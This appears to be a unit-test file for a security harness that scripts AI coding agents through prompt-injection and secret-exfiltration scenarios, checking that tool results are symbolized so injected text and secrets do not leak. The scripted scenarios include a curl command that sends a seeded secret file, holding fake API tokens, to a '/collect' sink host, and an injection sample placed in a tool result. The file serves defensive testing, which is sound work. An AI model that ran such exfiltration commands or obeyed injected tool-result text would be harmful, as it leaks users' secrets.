/**
 * agent-scenario-script.test.ts — unit tests for the MULTI-TURN scripted model
 * that drives the OpenClaw/OpenCode live suites (the drill runners' shared
 * anthropic-agent-runner.ts) and for the posture wiring it feeds.
 *
 * Mandu (tests/). Design: docs/design/testing/agent-e2e-harness.md §7.4.
 *
 * WHY THESE LIVE IN tests/stack/ (the FREE tier): the script builder and the
 * substitution are pure functions over a request body, so they run with no
 * agent, no network, and no arbiter — the same discipline as agent-provision's
 * tests. The multi-turn script is what makes the fsSync, net-egress and U-LLM
 * scenarios expressible at all (before it, exactly ONE tool call per scenario
 * was scriptable), so its turn-counting is worth pinning where every push runs.
 *
 * THE PROPERTY THAT MATTERS MOST: matching is SYMBOLIZATION-INVARIANT. On the
 * defended path a tool_result arrives as a `$MDU:` token; a script that keyed on
 * result CONTENT would behave differently exactly when the defense is working,
 * which is the one thing a security harness must never do.
 */

import { test } from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync, readFileSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";

import {
  countToolResults, LAST_TOOL_RESULT, EXFIL_SINK_HOST, INSPECT_MCP_SERVER, INJECTION,
  CONF_SECRET_FILE, confScenarios, type AgentScenario,
} from "../lib/anthropic-agent-runner.js";
import { extractToolResultText } from "../lib/fake-anthropic.js";

/** A Messages request body carrying `n` tool_results, with the LAST one holding
 *  `lastText` — the shape the scripted model counts turns off. */
function bodyWithToolResults(n: number, lastText = "result"): string {
  const messages: unknown[] = [{ role: "user", content: "do the thing" }];
  for (let i = 0; i < n; i++) {
    messages.push({
      role: "assistant",
      content: [{ type: "tool_use", id: `toolu_${i}`, name: "read", input: {} }],
    });
    messages.push({
      role: "user",
      content: [
        {
          type: "tool_result",
          tool_use_id: `toolu_${i}`,
          content: i === n - 1 ? lastText : `result ${i}`,
        },
      ],
    });
  }
  return JSON.stringify({ model: "m", messages });
}

// ── The turn counter ────────────────────────────────────────────────────────

test("countToolResults counts the tool_result blocks in a request", () => {
  assert.equal(countToolResults(bodyWithToolResults(0)), 0);
  assert.equal(countToolResults(bodyWithToolResults(1)), 1);
  assert.equal(countToolResults(bodyWithToolResults(3)), 3);
});

test("the turn counter is SYMBOLIZATION-INVARIANT", () => {
  // The same conversation, once with raw content and once with the symbol the
  // defense substitutes. The script must see an identical turn number, or it
  // would drive a different conversation exactly when the defense works.
  const raw = bodyWithToolResults(2, `notes say: ${INJECTION}`);
  const defended = bodyWithToolResults(2, "$MDU:read[a1b2c3]");
  assert.equal(countToolResults(raw), countToolResults(defended));
  assert.equal(countToolResults(defended), 2);
});

// ── The LAST_TOOL_RESULT substitution ────────────────────────────────────────

test("extractToolResultText pulls the LAST tool_result, symbolized or not", () => {
  assert.equal(
    extractToolResultText({ url: "/v1/messages", body: bodyWithToolResults(2, "$MDU:read[a1b2c3]"), hasToolResult: true }),
    "$MDU:read[a1b2c3]",
  );
  // Block-array content form (what a real agent sends) resolves too.
  const blocks = JSON.stringify({
    model: "m",
    messages: [
      {
        role: "user",
        content: [{ type: "tool_result", tool_use_id: "t1", content: [{ type: "text", text: "$MDU:read[ffff]" }] }],
      },
    ],
  });
  assert.equal(
    extractToolResultText({ url: "/v1/messages", body: blocks, hasToolResult: true }),
    "$MDU:read[ffff]",
  );
});

test("LAST_TOOL_RESULT is a sentinel no real tool input could collide with", () => {
  // It is substituted by exact equality on a top-level value, so it must be a
  // value nothing legitimately equals.
  assert.match(LAST_TOOL_RESULT, /MDU_LAST_TOOL_RESULT/);
  assert.notEqual(LAST_TOOL_RESULT, "MDU_LAST_TOOL_RESULT");
});

test("a step carrying LAST_TOOL_RESULT is what makes a write-back real", () => {
  // The point of the sentinel: step 2's payload is whatever step 1's result
  // ACTUALLY was. On the defended path that is the symbol; if symbolization
  // regressed, the identical script would carry the raw injection — and the
  // oracles would then catch it. The script asserts nothing about which.
  const defended = extractToolResultText({
    url: "/v1/messages",
    body: bodyWithToolResults(1, "$MDU:read[a1b2c3]"),
    hasToolResult: true,
  });
  const regressed = extractToolResultText({
    url: "/v1/messages",
    body: bodyWithToolResults(1, `notes say: ${INJECTION}`),
    hasToolResult: true,
  });
  assert.equal(defended, "$MDU:read[a1b2c3]");
  assert.ok(regressed?.includes(INJECTION), "an undefended run would carry raw bytes into step 2");
});

// ── Constants the scenarios key on ───────────────────────────────────────────

test("the exfil sink is a plainly untrusted host, not a mock-catalog site", () => {
  // The gate must have something to refuse: a catalogued host would answer 200
  // and the scenario would prove nothing.
  assert.match(EXFIL_SINK_HOST, /\.test$/);
  assert.ok(!EXFIL_SINK_HOST.includes("example.test"), "must not collide with the mock catalog domain");
});

test("the inspect mount name yields OpenCode's single-underscore tool name", () => {
  // OpenCode surfaces MCP tools as <server>_<tool>; the arbiter's exact-name set
  // (arbiter/policy/inspect-tool.ts) must contain exactly this spelling.
  assert.equal(`${INSPECT_MCP_SERVER}_inspect_symbol`, "mandu-inspect_inspect_symbol");
});

// ── The confidentiality scenarios (test-organization.md §7.1) ────────────────

test("confScenarios: a labelled read + sink exfil, a labelled net-proxy upload, and an unlabelled control", () => {
  const scenarios = confScenarios({ readInput: (path) => ({ path }), shell: "exec" }, "T");
  assert.deepEqual(scenarios.map((s) => s.name), ["secret-read-exfil", "secret-net-exfil-blocked", "secret-read-control"]);
  const [exfil, net, control] = scenarios as [AgentScenario, AgentScenario, AgentScenario];
  // The labelled legs label the seeded file no-model; the control leaves it
  // unlabelled, which is what makes it the control.
  assert.deepEqual(exfil.conf?.label, { file: CONF_SECRET_FILE, level: "no-model" });
  assert.deepEqual(net.conf?.label, { file: CONF_SECRET_FILE, level: "no-model" });
  assert.equal(control.conf?.label, undefined);
  assert.equal(control.fakeOnly, true, "the control's script is the point: fake tier only");
  // Each leg has its own canary; the net leg stands the net-proxy up.
  const canaries = scenarios.map((s) => s.conf!.canary);
  assert.equal(new Set(canaries).size, 3);
  for (const c of canaries) assert.match(c, /^MDUCONF_T[XNC]_[0-9a-f]{12}$/);
  assert.equal(net.conf?.exfil, "net-proxy");
  assert.equal(net.needsWeb, true);
  assert.equal(exfil.conf?.exfil, "sink");
});

test("confScenarios: the scripted exfil carries whatever the read ACTUALLY returned", () => {
  const [exfil, net] = confScenarios({ readInput: (filePath) => ({ filePath }), shell: "bash" }, "T") as AgentScenario[];
  const ctx = { workspaceFile: "/ws/notes.md", provisioner: {} as never, sinkOrigin: "http://127.0.0.1:9" };
  const [read, send] = exfil!.fake!.toolUses!.map((f) => f(ctx)!);
  assert.deepEqual(read, { name: "read", input: { filePath: `/ws/${CONF_SECRET_FILE}` } });
  assert.equal(send!.name, "bash");
  assert.equal(typeof send!.input, "function");
  const render = send!.input as (last: string | null) => Record<string, unknown>;
  // Defended path: the symbol goes out. On a regressed path the raw bytes
  // would, and the sink oracle catches them. The script decides neither.
  const cmd = String(render("$MDU:nomodel_read[a1b2]")["command"]);
  assert.match(cmd, /^curl --noproxy '' .*http:\/\/127\.0\.0\.1:9\/collect <<'MDU_EXFIL_EOF'\n\$MDU:nomodel_read\[a1b2\]\nMDU_EXFIL_EOF$/s);
  // The net leg goes THROUGH the net-proxy, to the untrusted host.
  const netStep = net!.fake!.toolUses![1]!(ctx)!;
  const netCmd = String((netStep.input as (l: string | null) => Record<string, unknown>)("SYM")["command"]);
  assert.ok(!netCmd.includes("--noproxy"), "the net leg must use the net-proxy");
  assert.ok(netCmd.includes(`http://${EXFIL_SINK_HOST}/collect`));
});

test("confScenarios: each leg seeds the spelling's fileBody (OpenClaw 2026.9.x masks key-shaped values itself), else the default body", () => {
  const seeded = (scenarios: AgentScenario[]): string[] => {
    const dir = mkdtempSync(join(tmpdir(), "mdu-conf-seed-"));
    try {
      return scenarios.map((s) => { s.setup!(dir); return readFileSync(join(dir, CONF_SECRET_FILE), "utf8"); });
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  };
  const custom = confScenarios({ readInput: (path) => ({ path }), shell: "exec", fileBody: (c) => `PARTNER_API_TOKEN=ptk-live-${c}\n` }, "T");
  seeded(custom).forEach((body, i) => assert.equal(body, `PARTNER_API_TOKEN=ptk-live-${custom[i]!.conf!.canary}\n`));
  const plain = confScenarios({ readInput: (path) => ({ path }), shell: "exec" }, "T");
  seeded(plain).forEach((body, i) => assert.equal(body, `PARTNER_API_TOKEN=sk-live-${plain[i]!.conf!.canary}\n`));
});
